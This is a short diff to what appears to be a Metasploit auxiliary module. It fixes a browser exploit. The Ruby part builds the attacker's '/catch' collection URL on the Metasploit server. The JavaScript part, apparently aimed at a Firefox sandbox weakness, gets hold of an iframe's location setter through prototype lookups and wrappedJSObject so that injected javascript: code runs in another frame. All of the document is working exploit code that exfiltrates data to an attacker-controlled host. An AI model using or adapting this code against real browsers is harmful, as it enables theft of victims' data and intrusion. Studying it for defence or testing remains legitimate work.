@@ -90,7 +90,9 @@ class Metasploit3 < Msf::Auxiliary
     proto = (datastore["SSL"] ? "https" : "http")
     myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
     port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
-    "#{proto}://#{myhost}#{port_str}/#{datastore['URIPATH']}/catch"
+    resource = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource
+
+    "#{proto}://#{myhost}#{port_str}#{resource}/catch"
   end
 
 
@@ -142,7 +144,9 @@ function get(path, callback, timeout, template, value) {
   }, "%url%", path);
   js_call2 = 'javascript:;try{updateHidden();}catch(e){};' + callback + ';undefined';
   sandboxContext(_(function() {
+    i = document.getElementById('i');
     p = __proto(i.contentDocument.styleSheets[0].ownerNode);
+    i2 = document.getElementById('i2');
     l = p.__lookupSetter__.call(i2.contentWindow, 'location');
     l.call(i2.contentWindow, window.wrappedJSObject.js_call1);
   }));
